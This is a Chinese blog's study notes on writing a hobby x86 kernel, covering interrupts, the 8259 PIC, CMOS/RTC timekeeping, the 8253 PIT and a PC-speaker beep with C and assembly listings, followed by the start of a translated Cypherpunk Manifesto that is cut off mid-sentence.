I/O接口触发9号中断通过数据总线送到CPU的中断逻辑中，并且将信号通过数据总线发送到数据缓冲寄存器中 CPU会根据标志寄存器IF位判断，是1就响应，0则等待，中断逻辑检测到9号中断，触发9号中断处理程序(这个处理程序就是我们要写的)，电路级别的是从CPU内部实现的，信号传递是通过CPU针脚传递 同时CPU将键盘信号0x1E转为ASCII码0x61 再将0x1E和0x61组合送到内存-键盘缓冲区中（ASCII地位，信号高位） 最后CPU向键盘发送应答信息 最开始的PS2协议的键盘(圆头的)就是通过这种方式进行输入的 所以我们需要做相当多的关于硬件的操作，有点像计组了 src/include/xsys/interrupt.h 定义了一些中断编号 1234567891011121314151617#define IRQ_CLOCK 0 // 时钟#define IRQ_KEYBOARD 1 // 键盘#define IRQ_CASCADE 2 // 8259 从片控制器#define IRQ_SERIAL_2 3 // 串口 2#define IRQ_SERIAL_1 4 // 串口 1#define IRQ_PARALLEL_2 5 // 并口 2#define IRQ_FLOPPY 6 // 软盘控制器#define IRQ_PARALLEL_1 7 // 并口 1#define IRQ_RTC 8 // 实时时钟#define IRQ_REDIRECT 9 // 重定向 IRQ2#define IRQ_MOUSE 12 // 鼠标#define IRQ_MATH 13 // 协处理器 x87#define IRQ_HARDDISK 14 // ATA 硬盘第一通道#define IRQ_HARDDISK2 15 // ATA 硬盘第二通道#define IRQ_MASTER_NR 0x20 // 主片起始向量号#define IRQ_SLAVE_NR 0x28 // 从片起始向量号 src/kernel/interrupt.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/global.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/printk.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)// #define LOGK(fmt, args...)#define ENTRY_SIZE 0x30#define PIC_M_CTRL 0x20 // 主片的控制端口#define PIC_M_DATA 0x21 // 主片的数据端口#define PIC_S_CTRL 0xa0 // 从片的控制端口#define PIC_S_DATA 0xa1 // 从片的数据端口#define PIC_EOI 0x20 // 通知中断控制器中断结束gate_t idt[IDT_SIZE];pointer_t idt_ptr;handler_t handler_table[IDT_SIZE];extern handler_t handler_entry_table[ENTRY_SIZE];static char *messages[] = &#123; &quot;#DE Divide Error\\0&quot;, &quot;#DB RESERVED\\0&quot;, &quot;-- NMI Interrupt\\0&quot;, &quot;#BP Breakpoint\\0&quot;, &quot;#OF Overflow\\0&quot;, &quot;#BR BOUND Range Exceeded\\0&quot;, &quot;#UD Invalid Opcode (Undefined Opcode)\\0&quot;, &quot;#NM Device Not Available (No Math Coprocessor)\\0&quot;, &quot;#DF Double Fault\\0&quot;, &quot; Coprocessor Segment Overrun (reserved)\\0&quot;, &quot;#TS Invalid TSS\\0&quot;, &quot;#NP Segment Not Present\\0&quot;, &quot;#SS Stack-Segment Fault\\0&quot;, &quot;#GP General Protection\\0&quot;, &quot;#PF Page Fault\\0&quot;, &quot;-- (Intel reserved. Do not use.)\\0&quot;, &quot;#MF x87 FPU Floating-Point Error (Math Fault)\\0&quot;, &quot;#AC Alignment Check\\0&quot;, &quot;#MC Machine Check\\0&quot;, &quot;#XF SIMD Floating-Point Exception\\0&quot;, &quot;#VE Virtualization Exception\\0&quot;, &quot;#CP Control Protection Exception\\0&quot;,&#125;;// 通知中断控制器，中断处理结束void send_eoi(int vector)&#123; if (vector &gt;= 0x20 &amp;&amp; vector &lt; 0x28) &#123; outb(PIC_M_CTRL, PIC_EOI); &#125; if (vector &gt;= 0x28 &amp;&amp; vector &lt; 0x30) &#123; outb(PIC_M_CTRL, PIC_EOI); outb(PIC_S_CTRL, PIC_EOI); &#125;&#125;u32 counter = 0;void default_handler(int vector)&#123; send_eoi(vector); LOGK(&quot;[%d] default interrupt called %d...\\n&quot;, vector, counter++);&#125;void exception_handler(int vector)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;Exception : [0x%02X] %s \\n&quot;, vector, messages[vector]); // 阻塞 hang();&#125;// 初始化中断控制器void pic_init()&#123; outb(PIC_M_CTRL, 0b00010001); // ICW1: 边沿触发, 级联 8259, 需要ICW4. outb(PIC_M_DATA, 0x20); // ICW2: 起始端口号 0x20 outb(PIC_M_DATA, 0b00000100); // ICW3: IR2接从片. outb(PIC_M_DATA, 0b00000001); // ICW4: 8086模式, 正常EOI outb(PIC_S_CTRL, 0b00010001); // ICW1: 边沿触发, 级联 8259, 需要ICW4. outb(PIC_S_DATA, 0x28); // ICW2: 起始端口号 0x28 outb(PIC_S_DATA, 2); // ICW3: 设置从片连接到主片的 IR2 引脚 outb(PIC_S_DATA, 0b00000001); // ICW4: 8086模式, 正常EOI outb(PIC_M_DATA, 0b11111110); // 关闭所有中断 outb(PIC_S_DATA, 0b11111111); // 关闭所有中断&#125;// 初始化中断描述符，和中断处理函数数组void idt_init()&#123; for (size_t i = 0; i &lt; ENTRY_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; handler_t handler = handler_entry_table[i]; gate-&gt;offset0 = (u32)handler &amp; 0xffff; gate-&gt;offset1 = ((u32)handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // 代码段 gate-&gt;reserved = 0; // 保留不用 gate-&gt;type = 0b1110; // 中断门 gate-&gt;segment = 0; // 系统段 gate-&gt;DPL = 0; // 内核态 gate-&gt;present = 1; // 有效 &#125; for (size_t i = 0; i &lt; 0x20; i++) &#123; handler_table[i] = exception_handler; &#125; for (size_t i = 20; i &lt; ENTRY_SIZE; i++) &#123; handler_table[i] = default_handler; &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125;void interrupt_init()&#123; pic_init(); idt_init();&#125; src/kernel/main.c 1234567891011121314151617181920void kernel_init()&#123; console_init(); gdt_init(); interrupt_init(); // task_init(); asm volatile( &quot;sti\\n&quot; &quot;movl %eax, %eax\\n&quot;); u32 counter = 0; while (true) &#123; DEBUGK(&quot;looping in kernel init %d...\\n&quot;, counter++); delay(1000000000); &#125; return;&#125; 具体步骤 在handler.asm下断点 会发现调用中断的时间都用不同，从asm volatile(&quot;sti\\n&quot;);之后，中断初始化完毕，开中断，标志寄存器IF位置1。则会调用中断处理函数 是因为CPU一直在监测中断，而不知道两个中断之间相隔多久，所以会这样乱序 参考 https://datasheetspdf.com/datasheet/80486.html https://www.bilibili.com/video/BV14e411s7CN 操作系统实现-任务中断与上下文 结合前面的知识，我们能否让中断帮助我们进行任务的切换 src/kernel/task.c 1234567891011121314151617u32 _ofp thread_a()//标及省略栈帧&#123; asm volatile(&quot;sti\\n&quot;);//开中断 while (true) &#123; printk(&quot;A&quot;); &#125;&#125;u32 _ofp thread_b()&#123; asm volatile(&quot;sti\\n&quot;);//开中断 while (true) &#123; printk(&quot;B&quot;); &#125;&#125; 由于我们通过中断进行任务的切换，所以要修改默认中断入口函数，由于要保存上下文，所以exception_handler报错是要打印相关寄存器的值；而且为了实现效果要打开中断 src/kernel/interrupt.c 12345678910111213141516171819202122232425262728293031323334353637383940void default_handler(int vector)&#123; send_eoi(vector); schedule();&#125;void exception_handler( int vector, u32 edi, u32 esi, u32 ebp, u32 esp, u32 ebx, u32 edx, u32 ecx, u32 eax, u32 gs, u32 fs, u32 es, u32 ds, u32 vector0, u32 error, u32 eip, u32 cs, u32 eflags)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;\\nEXCEPTION : %s \\n&quot;, messages[vector]); printk(&quot; VECTOR : 0x%02X\\n&quot;, vector); printk(&quot; ERROR : 0x%08X\\n&quot;, error); printk(&quot; EFLAGS : 0x%08X\\n&quot;, eflags); printk(&quot; CS : 0x%02X\\n&quot;, cs); printk(&quot; EIP : 0x%08X\\n&quot;, eip); printk(&quot; ESP : 0x%08X\\n&quot;, esp); // 阻塞 hang();&#125;void pic_init()&#123; ...... outb(PIC_M_DATA, 0b11111110); // 关闭所有中断 ......&#125; 同时为了保存上下文，要在中断处理时保存栈地相关信息并设置跳转 src/kernel/handler.asm 12345678910111213141516171819202122232425262728interrupt_entry: ;保存上下文 push ds push es push fs push gs pusha ;找到压入的中断向量（因为保存了上下文） mov eax, [esp + 12*4] ;中断向量处理函数传递参数 push eax ; 调用中断处理函数，handler_table 中存储了中断处理函数的指针 call [handler_table + eax * 4] ; 对应 push %1，调用结束恢复栈 add esp, 4 ;回复上下文 popa pop gs pop fs pop es pop ds add esp ,8 iret 自然的main.c要初始化任务才行 src/kernel/main.c 12345678910111213141516extern void console_init();extern void gdt_init();extern void interrupt_init();extern void clock_init();extern void hang();void kernel_init()&#123; console_init(); gdt_init(); interrupt_init(); task_init(); asm volatile(&quot;sti&quot;); hang();&#125; 操作系统实现-时钟 中断小结 #操作系统实现-中断与系统调用 #操作系统实现-异常 #操作系统实现-外中断 之前已经有了3篇相关的文章，这里做一个较为具体的总结 中断存在的意义 外部信息传递到CPU进行处理 跟更好的利用CPU：A任务等待输入输出时，中断后去处理B任务 计算机发生了某些异常，需要处理器立即执行一些操作：除0异常 外中断 在8086时代，中断是通过两个信号线引入处理器的： NMI(None Maskable Interrupt，非屏蔽中断) Intel规定：只有存在超过4个时钟周期的NMI才能被处理器识别 RAM：内存校验错 IOCHK：I/O校验错 INTR(Interrupt，可屏蔽中断) 个人计算机中最常用的是中断代理：8259芯片 Intel允许使用256个中断，由图可知8256维持15个中断，并且8256中中断信号不固定，因此称为可编程中断控制器（Programmable Inpterrupt Controller，PIC） 又由图可知，要实现全部功能，需要两块8256进行芯片级联。 使用时钟功能：主片IRQ2 使用实时时钟：主片连接int(IRQ2)-&gt;从片IRQ8-&gt;主片IR2 时钟、CMOS、BCD编码 RTC 从简单的思路来说，你只需要一个实时时钟电路(Real Time Clock，RTC)和一个CMOS小块组成的静态存储器就可以实现时钟的功能。 一般的RTC是由振荡频率为32.768kHz的石英晶体振荡器驱动，分频过后进行每秒一次的刷新 CMOS 同样为了能让外部访问，该硬件有两个端口： CMOS 地址寄存器：0x70 CMOS 数据寄存器：0x71 同时有时间信息（） 偏移值 意义 0x1 CMOS_SECOND 0x3 CMOS_MINUTE 0x5 CMOS_HOUR 0xa CMOS_Areg 0xb CMOS_Breg 0xc CMOS_Creg 0xd CMOS_Dreg 0x80 CMOS_NMI BCD BCD(Binary Coded Decimal)是CMOS RAM中保存时间信息的格式 动态时钟的实现 除非是计算机考古学家，否则直接上手很难，所以直接参(开)考(抄)Linux /include/linux/time.h 1234567891011121314151617181920212223242526272829303132333435#ifndef _LINUX_TIME_H#define _LINUX_TIME_Hstruct timeval &#123; long tv_sec; /* seconds */ long tv_usec; /* microseconds */&#125;;struct timezone &#123; int tz_minuteswest; /* minutes west of Greenwich */ int tz_dsttime; /* type of dst correction */&#125;;#define NFDBITS __NFDBITS#define FD_SETSIZE __FD_SETSIZE#define FD_SET(fd,fdsetp) __FD_SET(fd,fdsetp)#define FD_CLR(fd,fdsetp) __FD_CLR(fd,fdsetp)#define FD_ISSET(fd,fdsetp) __FD_ISSET(fd,fdsetp)#define FD_ZERO(fdsetp) __FD_ZERO(fdsetp)/* * Names of the interval timers, and structure * defining a timer setting. */#define ITIMER_REAL 0#define ITIMER_VIRTUAL 1#define ITIMER_PROF 2struct itimerval &#123; struct timeval it_interval; /* timer interval */ struct timeval it_value; /* current value */&#125;;#endif 这个是Linux比较老的版本之一的，有点过时了，但是我们可以修改为 src/include/xsys/time.h 123456789101112131415161718192021222324#ifndef XSYS_TIME_H#define XSYS_TIME_H#include &lt;xsys/types.h&gt;typedef struct tm&#123; int tm_sec; int tm_min; int tm_hour; int tm_mday; int tm_mon; int tm_year; int tm_wday; int tm_yday; int tm_isdst;//夏令时标志&#125;tm;void time_read_bcd(tm *time);void time_read(tm *time);time_t mktime(tm *time);#endif 接着便是：初始化时间 src/kernel/time.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;xsys/time.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/stdlib.h&gt;#include &lt;xsys/rtc.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)#define CMOS_ADDR 0x70 // CMOS 地址寄存器#define CMOS_DATA 0x71 // CMOS 数据寄存器// 下面是 CMOS 信息的寄存器索引#define CMOS_SECOND 0x00 // (0 ~ 59)#define CMOS_MINUTE 0x02 // (0 ~ 59)#define CMOS_HOUR 0x04 // (0 ~ 23)#define CMOS_WEEKDAY 0x06 // (1 ~ 7) 星期天 = 1，星期六 = 7#define CMOS_DAY 0x07 // (1 ~ 31)#define CMOS_MONTH 0x08 // (1 ~ 12)#define CMOS_YEAR 0x09 // (0 ~ 99)#define CMOS_CENTURY 0x32 // 可能不存在#define CMOS_NMI 0x80#define MINUTE 60 // 每分钟的秒数#define HOUR (60 * MINUTE) // 每小时的秒数#define DAY (24 * HOUR) // 每天的秒数#define YEAR (365 * DAY) // 每年的秒数，以 365 天算// 每个月开始时的已经过去天数static int month[13] = &#123; 0, // 这里占位，没有 0 月，从 1 月开始 0, (31), (31 + 29), (31 + 29 + 31), (31 + 29 + 31 + 30), (31 + 29 + 31 + 30 + 31), (31 + 29 + 31 + 30 + 31 + 30), (31 + 29 + 31 + 30 + 31 + 30 + 31), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31 + 30), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31 + 30 + 31), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31 + 30 + 31 + 30)&#125;;time_t startup_time;int century;// 这里生成的时间可能和 UTC 时间有出入// 与系统具体时区相关，不过也不要紧，顶多差几个小时time_t mktime(tm *time)&#123; time_t res; int year; // 1970 年开始的年数 // 下面从 1900 年开始的年数计算 if (time-&gt;tm_year &gt;= 70) year = time-&gt;tm_year - 70; else year = time-&gt;tm_year - 70 + 100; // 这些年经过的秒数时间 res = YEAR * year; // 已经过去的闰年，每个加 1 天 res += DAY * ((year + 1) / 4); // 已经过完的月份的时间 res += month[time-&gt;tm_mon] * DAY; // 如果 2 月已经过了，并且当前不是闰年，那么减去一天 if (time-&gt;tm_mon &gt; 2 &amp;&amp; ((year + 2) % 4)) res -= DAY; // 这个月已经过去的天 res += DAY * (time-&gt;tm_mday - 1); // 今天过去的小时 res += HOUR * time-&gt;tm_hour; // 这个小时过去的分钟 res += MINUTE * time-&gt;tm_min; // 这个分钟过去的秒 res += time-&gt;tm_sec; return res;&#125;int get_yday(tm *time)&#123; int res = month[time-&gt;tm_mon]; // 已经过去的月的天数 res += time-&gt;tm_mday; // 这个月过去的天数 int year; if (time-&gt;tm_year &gt;= 70) year = time-&gt;tm_year - 70; else year = time-&gt;tm_year - 70 + 100; // 如果不是闰年，并且 2 月已经过去了，则减去一天 // 注：1972 年是闰年，这样算不太精确，忽略了 100 年的平年 if ((year + 2) % 4 &amp;&amp; time-&gt;tm_mon &gt; 2) &#123; res -= 1; &#125; return res;&#125;void time_read_bcd(tm *time)&#123; // CMOS 的访问速度很慢。为了减小时间误差，在读取了下面循环中所有数值后， // 若此时 CMOS 中秒值发生了变化，那么就重新读取所有值。 // 这样内核就能把与 CMOS 的时间误差控制在 1 秒之内。 do &#123; time-&gt;tm_sec = cmos_read(CMOS_SECOND); time-&gt;tm_min = cmos_read(CMOS_MINUTE); time-&gt;tm_hour = cmos_read(CMOS_HOUR); time-&gt;tm_wday = cmos_read(CMOS_WEEKDAY); time-&gt;tm_mday = cmos_read(CMOS_DAY); time-&gt;tm_mon = cmos_read(CMOS_MONTH); time-&gt;tm_year = cmos_read(CMOS_YEAR); century = cmos_read(CMOS_CENTURY); &#125; while (time-&gt;tm_sec != cmos_read(CMOS_SECOND));&#125;void time_read(tm *time)&#123; time_read_bcd(time); time-&gt;tm_sec = bcd_to_bin(time-&gt;tm_sec); time-&gt;tm_min = bcd_to_bin(time-&gt;tm_min); time-&gt;tm_hour = bcd_to_bin(time-&gt;tm_hour); time-&gt;tm_wday = bcd_to_bin(time-&gt;tm_wday); time-&gt;tm_mday = bcd_to_bin(time-&gt;tm_mday); time-&gt;tm_mon = bcd_to_bin(time-&gt;tm_mon); time-&gt;tm_year = bcd_to_bin(time-&gt;tm_year); time-&gt;tm_yday = get_yday(time); time-&gt;tm_isdst = -1; century = bcd_to_bin(century);&#125;void time_init()&#123; tm time; time_read(&amp;time); startup_time = mktime(&amp;time); LOGK(&quot;startup time: %d%d-%02d-%02d %02d:%02d:%02d\\n&quot;, century, time.tm_year, time.tm_mon, time.tm_mday, time.tm_hour, time.tm_min, time.tm_sec);&#125; 12345678u8 bcd_to_bin(u8 value)&#123; return (value &amp; 0xf) + (value &gt;&gt; 4) *10;&#125;u8 bin_to_bcd(u8 value)&#123; return (value / 10)*0x10 + (value % 10);&#125; 基本上就是调用上述接口就可以实现 1234567891011121314151617extern void console_init();extern void gdt_init();extern void interrupt_init();extern void clock_init();extern void time_init();extern void rtc_init();extern void hang();void kernel_init()&#123; console_init(); gdt_init(); interrupt_init(); time_init(); asm volatile(&quot;sti&quot;); hang();&#125; makefile的qemu选项里面加上-rtc base=localtime，就可以得到当前时区时间，就不需要我们手动计算了 动态时钟就需要对RTC进行更多操作 而且我们对RTC的基本操作很少 src/include/xsys/rtc.h 12345678#ifndef XSYS_RTC_H#define XSYS_RTC_Hvoid set_alarm(u32 secs);u8 cmos_read(u8 addr);void cmos_write(u8 addr, u8 value);#endif src/kernel/rtc.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#include &lt;xsys/types.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/time.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/stdlib.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)#define CMOS_ADDR 0x70 // CMOS 地址寄存器#define CMOS_DATA 0x71 // CMOS 数据寄存器#define CMOS_SECOND 0x01#define CMOS_MINUTE 0x03#define CMOS_HOUR 0x05#define CMOS_A 0x0a#define CMOS_B 0x0b#define CMOS_C 0x0c#define CMOS_D 0x0d#define CMOS_NMI 0x80// 读 cmos 寄存器的值u8 cmos_read(u8 addr)&#123; outb(CMOS_ADDR, CMOS_NMI | addr); return inb(CMOS_DATA);&#125;;// 写 cmos 寄存器的值void cmos_write(u8 addr, u8 value)&#123; outb(CMOS_ADDR, CMOS_NMI | addr); outb(CMOS_DATA, value);&#125;static u32 volatile counter = 0;// 实时时钟中断处理函数void rtc_handler(int vector)&#123; // 实时时钟中断向量号 assert(vector == 0x28); // 向中断控制器发送中断处理完成的信号 send_eoi(vector); // 读 CMOS 寄存器 C，允许 CMOS 继续产生中断 cmos_read(CMOS_C); set_alarm(1); LOGK(&quot;rtc handler %d...\\n&quot;, counter++);&#125;// 设置 secs 秒后发生实时时钟中断void set_alarm(u32 secs)&#123; tm time; time_read(&amp;time); u8 sec = secs % 60; secs /= 60; u8 min = secs % 60; secs /= 60; u32 hour = secs; time.tm_sec += sec; if (time.tm_sec &gt;= 60) &#123; time.tm_sec %= 60; time.tm_min += 1; &#125; time.tm_min += min; if (time.tm_min &gt;= 60) &#123; time.tm_min %= 60; time.tm_hour += 1; &#125; time.tm_hour += hour; if (time.tm_hour &gt;= 24) &#123; time.tm_hour %= 24; &#125; cmos_write(CMOS_HOUR, bin_to_bcd(time.tm_hour)); cmos_write(CMOS_MINUTE, bin_to_bcd(time.tm_min)); cmos_write(CMOS_SECOND, bin_to_bcd(time.tm_sec));&#125;void rtc_init()&#123; u8 prev; cmos_write(CMOS_B, 0b01000010); // 打开周期中断 // cmos_write(CMOS_B, 0b00100010); // 打开闹钟中断 cmos_read(CMOS_C); // 读 C 寄存器，以允许 CMOS 中断 // set_alarm(2); // 设置中断频率 outb(CMOS_A, (inb(CMOS_A) &amp; 0xf) | 0b1110); set_interrupt_handler(IRQ_RTC, rtc_handler); set_interrupt_mask(IRQ_RTC, true); set_interrupt_mask(IRQ_CASCADE, true);&#125; 着重说一下rtc_init 123456789101112131415void rtc_init()&#123; u8 prev; cmos_write(CMOS_B, 0b01000010); // 打开周期中断 // cmos_write(CMOS_B, 0b00100010); // 打开闹钟中断 cmos_read(CMOS_C); // 读 C 寄存器，以允许 CMOS 中断 // set_alarm(2); // 设置中断频率 outb(CMOS_A, (inb(CMOS_A) &amp; 0xf) | 0b1110); set_interrupt_handler(IRQ_RTC, rtc_handler); set_interrupt_mask(IRQ_RTC, true); set_interrupt_mask(IRQ_CASCADE, true);&#125; cmos_write(CMOS_B, 0b01000010); // 打开周期中断是单纯的基本中断，即CMOS按照其固定的时间刷新 cmos_write(CMOS_B, 0b00100010);我们就可以设置每次中断发生的时间，比如上面注释掉的set_alarm(2);就是中断每2s发生一次 两个数值(功能)的选择可以从8256芯片的级联图中看出 时钟中断 常用的可编程定时计数器 (Programmable Interval Timer PIT) 有 Intel 8253/8254，其中 8254 可以称为 8253 的增强版。 在 8253 内部有 3 个独立的计数器，分别是计数器 0 ~ 2，端口号分别为 0x40 ~ 0x42；每个计数器完全相同，都是 16 位大小，相互独立，互不干涉。 8253 计数器是个减法计数器，从初值寄存器中得到初值，然后载入计数器中，然后随着时钟变化递减。计数器初值寄存器，计数器执行寄存器，和输出锁存器都是 16 位的寄存器，高八位和低八位可以单独访问。 计数器 0 用于产生时钟中断，就是连接在 IRQ0 引脚上的时钟，也就是控制计数器 0 可以控制时钟发生的频率，以改变时间片的间隔； 控制字结构： 7 6 5 4 3 2 1 0 SC1 SC0 RL1 RL0 M2 M1 M0 BCD 三个计数器有自己各自的用途： 计数器 0，端口号 0x40，用于产生时钟信号，它采用工作方式 3； 计数器 1，端口号 0x41，用于 DRAM 的定时刷新控制； 计数器 2，端口号 0x42，用于内部扬声器发出不同音调的声音，原理是给扬声器输送某频率的方波； src/kernel/clock.c 1234567891011121314151617181920212223242526272829303132#include &lt;xsys/io.h&gt;#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#define PIT_CHAN0_REG 0X40#define PIT_CHAN2_REG 0X42#define PIT_CTRL_REG 0X43void clock_handler(int vector)&#123; assert(vector == 0x20); send_eoi(vector); jiffies++; DEBUGK(&quot;clock jiffies %d ...\\n&quot;, jiffies);&#125;void pit_init()&#123; // 配置计数器 0 时钟 outb(PIT_CTRL_REG, 0b00110100); outb(PIT_CHAN0_REG, CLOCK_COUNTER &amp; 0xff); outb(PIT_CHAN0_REG, (CLOCK_COUNTER &gt;&gt; 8) &amp; 0xff);&#125;void clock_init()&#123; pit_init(); set_interrupt_handler(IRQ_CLOCK, clock_handler); set_interrupt_mask(IRQ_CLOCK, true);&#125; 但是这个例子没什么实际的东西，我们看到的也只有上面不断显示的字符，下面就有了更好的体验 蜂鸣器 由PIT我们可以设置方波来发出声音，要添加一些东西 12345678910111213141516171819202122232425262728293031#define HZ 100#define OSCILLATOR 1193182#define CLOCK_COUNTER (OSCILLATOR / HZ)#define JIFFY (1000 / HZ)#define SPEAKER_REG 0x61#define BEEP_HZ 440#define BEEP_COUNTER (OSCILLATOR / BEEP_HZ)u32 volatile jiffies = 0;u32 jiffy = JIFFY;u32 volatile beeping = 0;void start_beep()&#123; if (!beeping) &#123; outb(SPEAKER_REG, inb(SPEAKER_REG) | 0b11); &#125; beeping = jiffies + 5;&#125;void stop_beep()&#123; if (beeping &amp;&amp; jiffies &gt; beeping) &#123; outb(SPEAKER_REG, inb(SPEAKER_REG) &amp; 0xfc); beeping = 0; &#125;&#125; 同时修改clock_handler 1234567891011121314void clock_handler(int vector)&#123; assert(vector == 0x20); send_eoi(vector); if(jiffies % 200 == 0) &#123; start_beep(); &#125; jiffies++; DEBUGK(&quot;clock beep %d ...\\n&quot;, jiffies); stop_beep();&#125; 在qemu上发声我的不知道是什么原因不行，但是导出在VMware上就可以了 软中断 这个里面就包括了最开始说的除0异常。软中断是发生在计算机内部的中断信号，是由执行指令引起的 操作系统实现-中断与系统调用和操作系统实现-异常主要讲的就是这种中断 CPU时钟周期和前面实时时钟的不一样，CPU内部是有一个时钟周期作为指令操作的最小步骤的，当CPU运算快时，时钟周期就短（其倒数频率就越大），如Intel(R) Core(TM) i5-9300H CPU的基础时钟频率就是2.6GHz，每个时钟周期的时间就是1/(2.6*1024*1024*1024)秒。 引用 x86汇编语言：从实模式到保护模式 / 李忠，王晓波，余洁著 中断处理 - 上半部（硬中断） 操作系统实现-内存管理初步 复习 计算机启动过程 386/486 内存分页中以 4KB 为一页 奔腾处理器使用4M为一页","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"os","slug":"notes/os","permalink":"https://joe1sn.eu.org/categories/notes/os/"}],"tags":[{"name":"os","slug":"os","permalink":"https://joe1sn.eu.org/tags/os/"}]},{"title":"密码朋克：一份密码朋克宣言","slug":"cypherpunk","date":"2022-08-14T07:25:53.000Z","updated":"2023-06-01T14:26:03.768Z","comments":true,"path":"2022/08/14/cypherpunk/","link":"","permalink":"https://joe1sn.eu.org/2022/08/14/cypherpunk/","excerpt":"为何自由与隐私如此重要","text":"为何自由与隐私如此重要 译文 一份密码朋克宣言 Eric Hughes著 Joe1sn渣译 隐私在电子时代对于一个开放的社会是必要的。隐私不是保密。隐私是一个人不想让全世界知道，但是保密是一个人不想让全任何人知道。隐私是一个人对这个世界选择性表达自我的权力。 如果双方有某种交易，那么每一方都有他们互动的记忆。 每一方都可以谈论他们自己对此的记忆； 谁能阻止这发生？人们可以通过法律反对它，但是对于言论自由甚至比隐私更加重要，这是开放社会的基础。如果多方在同一个论坛上共同发言，则每一方都可以与其他所有方共同对话，并将个体的和其他只是汇总在一起。电子通信的力量已经使这种讲话称为可能，它不会仅仅因为我们可能想要它而消失。 既然我们渴望隐私，我们必须确保交易的每方只有直接与该交易相关的必要的信息。鉴于所有信息都能被表达出，我们必须确保尽可能少地透露无关信息。对于大多数例子中的个人标识(ID)的需要并不是十分突出。当我们在商店中购买一本杂志并付款给店员时，并没有必要知道我是谁。当我让我的电子邮箱提供方收发邮件时，我的提供方不需要知道谁与我对话或者我和其他人说了些什么。我的提供方只需要知道如何在那里获取信息以及我欠他们多少费用。当我的身份在交易的底层机制中被揭露了，我就失去了隐私。我不能在这里选择性地展示自己； 我必须 经常 暴露自己。 因此，为了开放社会中的隐私就需要一种匿名交易系统。直到现在，现金是第一个满足这个条件的系统。一个匿名的交易系统不是一个保密的交易系统。一个匿名的交易系统的个体具有想揭露自身身份就揭露的权力；这也是隐私的本质。 在开放社会中的隐私也需要密码学。如果我说了些什么，我只想让我想知道的人知道。如果我的私密讲话被全世界知道，我就失去了隐私。对信息的加密表明了对隐私的追求，使用弱加密算法加密表达的是对与隐私不是特别的追求。此外，为了在默认匿名的情况下显示一个人的身份，需要密码学签名。 我们不能指望政府，企业，其他巨头、不露面的组织出于他们的善意保证我们的隐私。谈论我们对他们是有利的，并且我们认为他们会谈论我们。去尝试保护他们的演讲就是反击信息的真实。信息不是想要自由，而是注定自由。信息扩大到每一个可用的存储空间。信息是谣言更年轻，更强壮的的表亲；信息比谣言更快，有更多的眼睛，知道的更多，了解的更少。 我们必须保护我们的隐私如果我们期望的话。我们必须在一起共同创造允许匿名交易发生的系统。人们在几个世纪内通过耳语，黑暗，信封，紧闭的门，秘密握手和邮递保护他们的隐私。旧时代的科技并不允许有很私密的隐私，但是电子科技可以。 我们密码朋克投入到建设匿名系统。我们使用密码学、匿名邮件、数字签名和电子货币来保卫我们的隐私。 密码朋克编写代码。我们知道有人必须编写软件来保护隐私，并且除非我们都这样做，否则我们无法获得隐私，因此我们将编写它。我们发布我们的代码所以其他的密码朋克可以练习和玩耍这些代码。我们的代码是全世界性的免费使用的。我们并不关心如果你不赞同我们编写的软件。我们知道软件是不可能被毁灭的并且一个大范围部署的系统是不能被关停的。 密码朋克对密码学的规定感到痛惜，因为加密本质上是一种私人行为。事实上，对于加密这种行为，让信息从公众领域中被移除。即使是反对密码学的法律也只能触及一个国家的边界和它的暴力武器。密码朋克会不可避免地在全球发展，伴随着的是匿名交易系统使这成为可能。 为了隐私权的广泛传播它必须成为社会共识的一部分。人们必须为了共同利益来部署这些系统。隐私只能延伸到社会同胞的合作范围内。我们密码朋克寻求您的问题和疑虑，并希望我们可以与您互动，以免我们自欺欺人。然而，我们不会因为有些人可能不同意我们的目标而离开我们的目标。 密码朋克积极致力于使网络更安全以保护隐私。 让我们一起快速前进。 向前。 Eric Hughes 1993年3月9日 原文 A Cypherpunk’s Manifesto by Eric Hughes Privacy is necessary for an open society in the electronic age. Privacy is not secrecy. A private matter is something one doesn’t want the whole world to know, but a secret matter is something one doesn’t want anybody to know. Privacy is the power to selectively reveal oneself to the world. If two parties have some sort of dealings, then each has a memory of their interaction. Each party can speak about their own memory of this; how could anyone prevent it? One could pass laws against it, but the freedom of speech, even more than privacy, is fundamental to an open society; we seek not to restrict any speech at all. If many parties speak together in the same forum, each can speak to all the others and aggregate together knowledge about individuals and other parties. The power of electronic communications has enabled such group speech, and it will not go away merely because we might want it to. Since we desire privacy, we must ensure that each party to a transaction have knowledge only of that which is directly necessary for that transaction. Since any information can be spoken of, we must ensure that we reveal as little as possible. In most cases personal identity 